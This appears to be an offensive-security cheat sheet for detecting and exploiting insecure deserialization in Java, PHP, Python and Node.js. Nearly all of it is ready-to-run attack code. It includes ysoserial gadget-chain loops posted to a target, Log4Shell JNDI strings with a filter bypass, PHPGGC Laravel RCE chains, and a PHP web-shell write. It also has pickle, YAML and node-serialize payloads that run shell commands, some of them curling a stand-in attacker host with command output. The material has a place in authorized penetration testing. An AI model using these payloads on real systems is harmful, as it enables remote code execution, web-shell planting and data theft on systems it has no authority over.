# Deserialization Vulnerabilities — Java, PHP, Python, Node.js

Detect and exploit insecure deserialization across common languages/frameworks. All CLI-based, no GUI required.

## Install

```bash
# ysoserial (Java gadget chains):
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar -O /opt/ysoserial.jar

# PHPGGC (PHP gadget chains):
git clone https://github.com/ambionics/phpggc /opt/phpggc

# Marshalsec (Java deserialization):
# https://github.com/mbechler/marshalsec

# Python:
pip install pyyaml pickle5 --break-system-packages
```

---

## Phase 1: Detection

```bash
# Java serialization magic bytes: AC ED 00 05
# Base64 encoded: rO0AB (very common in cookies/parameters)

# Check HTTP requests for serialized data:
curl -s "https://target.com/" -v 2>&1 | grep -i "viewstate\|__VIEWSTATE\|rO0AB\|AC ED"

# Check cookies for Java serialization:
curl -s "https://target.com/" -c cookies.txt
grep -oE 'rO0AB[A-Za-z0-9+/=]+' cookies.txt

# Check for PHP serialization patterns (O:4:"User":1:{...}):
curl -s "https://target.com/" | grep -oE 'O:[0-9]+:"[^"]+\":[0-9]+:\{[^}]+\}'

# Look for serialized data in URL parameters:
curl -s "https://target.com/app?data=rO0ABXNyAA..."

# Check .NET ViewState:
curl -s "https://target.com/" | grep -oE '__VIEWSTATE[^"]*"[^"]*"'
```

---

## Phase 2: Java — ysoserial Gadget Chains

```bash
# Test with DNS callback first (OOB detection, safe):
# Using CommonsCollections1 gadget:
java -jar /opt/ysoserial.jar CommonsCollections1 \
  "nslookup YOURHOST.interactsh.com" > payload_cc1.ser

# Common gadget chains (try in order):
GADGETS=(CommonsCollections1 CommonsCollections2 CommonsCollections3
         CommonsCollections4 CommonsCollections5 CommonsCollections6
         CommonsCollections7 Spring1 Spring2 Jdk7u21 BeanShell1)

COMMAND="nslookup test.YOURHOST.interactsh.com"

for gadget in "${GADGETS[@]}"; do
  echo "Trying $gadget..."
  java -jar /opt/ysoserial.jar $gadget "$COMMAND" 2>/dev/null | \
    base64 -w0 > /tmp/payload_${gadget}.b64

  # Send to target:
  PAYLOAD=$(cat /tmp/payload_${gadget}.b64)
  curl -s -X POST "https://target.com/deserialize" \
    -H "Content-Type: application/octet-stream" \
    --data-binary "@/tmp/payload_${gadget}.b64" \
    -o /dev/null -w "%{http_code} $gadget\n"
done

# If OOB hits → RCE payload:
java -jar /opt/ysoserial.jar CommonsCollections1 \
  "curl https://YOURHOST.interactsh.com/\$(id)" | base64 -w0 > rce_payload.b64
```

---

## Phase 3: Java — JNDI/Log4Shell Deserialization

```bash
# Log4Shell (CVE-2021-44228) — JNDI injection via deserialization:
JNDI_PAYLOAD="\${jndi:ldap://YOURHOST.interactsh.com/a}"

# Test in common injection points:
curl -s "https://target.com/" \
  -H "X-Api-Version: $JNDI_PAYLOAD" \
  -H "User-Agent: $JNDI_PAYLOAD" \
  -H "X-Forwarded-For: $JNDI_PAYLOAD" \
  -H "Referer: $JNDI_PAYLOAD"

# URL-encoded:
curl -s "https://target.com/search?q=%24%7Bjndi%3Aldap%3A%2F%2FYOURHOST.interactsh.com%2Fa%7D"

# Obfuscation bypass:
BYPASS="\${j\${::-n}di:ldap://YOURHOST.interactsh.com/a}"
curl -s "https://target.com/" -H "User-Agent: $BYPASS"
```

---

## Phase 4: PHP — Object Injection

```bash
# PHP deserialization via unserialize() — craft gadget chains with PHPGGC

# List available gadgets:
php /opt/phpggc/phpggc -l

# Common targets:
php /opt/phpggc/phpggc -l | grep -i "laravel\|symfony\|wordpress\|drupal\|magento"

# Generate payload (RCE via Laravel POP chain):
php /opt/phpggc/phpggc Laravel/RCE1 "id > /tmp/pwned" | base64 -w0

# Generate payload for file write:
php /opt/phpggc/phpggc Laravel/FW1 /var/www/html/shell.php "<?php system(\$_GET['c']); ?>"

# Generate JSON-formatted payload:
php /opt/phpggc/phpggc -j Laravel/RCE1 "id"

# Send via cookie (PHP sessions often store serialized data):
PAYLOAD=$(php /opt/phpggc/phpggc Laravel/RCE1 "id > /tmp/test")
curl -s "https://target.com/profile" \
  -H "Cookie: PHPSESSID=$(echo $PAYLOAD | base64 -w0)"

# Test in common parameters:
curl -s "https://target.com/?data=$(php /opt/phpggc/phpggc Symfony/RCE4 'id' | base64 -w0)"
```

---

## Phase 5: PHP — __wakeup / __destruct Magic Methods

```bash
# Manual PHP object injection when source is known:
# Find classes with dangerous magic methods:
# __wakeup, __destruct, __toString, __call, __get, __set

# Craft serialized PHP object:
python3 -c "
# PHP serialization format:
# O:<classname_len>:\"<classname>\":<prop_count>:{<properties>}
# s:<len>:\"<string>\";
# i:<int>;
# b:<bool>;

# Example: inject object with file write in __destruct:
classname = 'FileLogger'
payload = f'O:{len(classname)}:\"{classname}\":2:{{s:4:\"path\";s:24:\"/var/www/html/shell.php\";s:4:\"data\";s:24:\"<?php system(\$_GET[c]); ?>\";}}'
print(payload)
"

# URL-encode and send:
curl -s "https://target.com/profile" \
  --data-urlencode "user_pref=O:10:\"FileLogger\":2:{...}"
```

---

## Phase 6: Python — Pickle / YAML / Marshal

```bash
# Python pickle deserialization RCE:
python3 -c "
import pickle, os, base64

class RCE:
    def __reduce__(self):
        return (os.system, ('curl https://YOURHOST.interactsh.com/\$(id)',))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print('Pickle payload (base64):')
print(payload)
"

# PyYAML unsafe load:
python3 -c "
import yaml
# yaml.load() without Loader=yaml.SafeLoader is vulnerable
payload = '!!python/object/apply:os.system [\"id > /tmp/pwned\"]'
print('YAML RCE payload:')
print(payload)
"

# Test YAML injection:
curl -s -X POST "https://target.com/api/config" \
  -H "Content-Type: application/yaml" \
  -d '!!python/object/apply:os.system ["curl https://YOURHOST.interactsh.com/"]'

# Python marshal (less common):
python3 -c "
import marshal, dis, types, base64
# Craft code object for RCE — advanced, rarely needed
"
```

---

## Phase 7: Node.js — node-serialize / serialize-javascript

```bash
# node-serialize vulnerable pattern: serialize.unserialize(userInput)

# Craft IIFE (Immediately Invoked Function Expression):
python3 -c "
import json
# node-serialize IIFE payload:
payload = {
    'rce': '_\$\$ND_FUNC\$\$_function(){require(\"child_process\").exec(\"curl https://YOURHOST.interactsh.com/\", function(error,stdout,stderr){console.log(stdout)});}()'
}
print(json.dumps(payload))
"

# Send to target:
curl -s -X POST "https://target.com/api/parse" \
  -H "Content-Type: application/json" \
  -d '{"profile":"{\"rce\":\"_$$ND_FUNC$$_function(){...}()\"}"}'
```

---

## Detection Checklist

```bash
# HTTP headers/params to test for deserialization:
# - Cookies with base64 content starting with rO0AB (Java) or O: (PHP)
# - X-Java-Serialized-Object header
# - application/x-java-serialized-object Content-Type
# - ViewState parameter in ASP.NET
# - PHPSESSID with serialized content
# - any parameter containing base64 with binary prefix

# Fingerprint Java libraries from error messages:
curl -s "https://target.com/deserialize" -d "AAAA" 2>&1 | \
  grep -i "commons\|spring\|xstream\|jackson\|fastjson"
```

---

## Pro Tips

1. **DNS OOB first** — safe, no side-effects, confirms the gadget chain works
2. **Try all CommonsCollections** — CC1-7 cover most Java app server versions
3. **Check error messages** — Java stack trace often reveals which libraries are loaded
4. **ViewState** — if `__VIEWSTATE` found and MAC not validated, .NET RCE via ysoserial
5. **PHPGGC `-l` filter** — use `grep -i` to find gadgets for detected framework
6. **pickle in ML APIs** — ML model serving endpoints often use pickle; huge attack surface
7. **FastJSON / Jackson** — JSON-based Java deserialization; different tooling (marshalsec)

## Summary

Deserialization flow: find base64/binary data in cookies/params → identify format (Java=rO0AB, PHP=O:, Python=gASV) → find gadget chain for detected libraries → test with DNS OOB payload → if hit → upgrade to RCE → document with full request/response.
